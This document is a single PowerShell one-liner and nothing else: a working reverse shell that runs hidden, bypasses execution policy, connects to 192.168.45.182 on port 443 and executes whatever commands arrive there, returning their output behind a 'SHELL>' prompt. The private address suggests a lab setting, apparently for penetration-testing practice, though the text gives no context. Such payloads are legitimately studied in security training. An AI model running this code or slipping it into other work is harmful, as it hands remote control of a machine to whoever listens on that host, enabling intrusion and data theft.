powershell -nop -W hidden -noni -ep bypass -c "$cli = New-Object Net.Sockets.TCPClient('192.168.45.182', 443);$NStream = $cli.GetStream();$SWrite = New-Object IO.StreamWriter($NStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$cli.ReceiveBufferSize | % {0};$SWrite.Write($String + 'SHELL> ');$SWrite.Flush()}WriteToStream '';while(($BytesRead = $NStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$SWrite.Close()"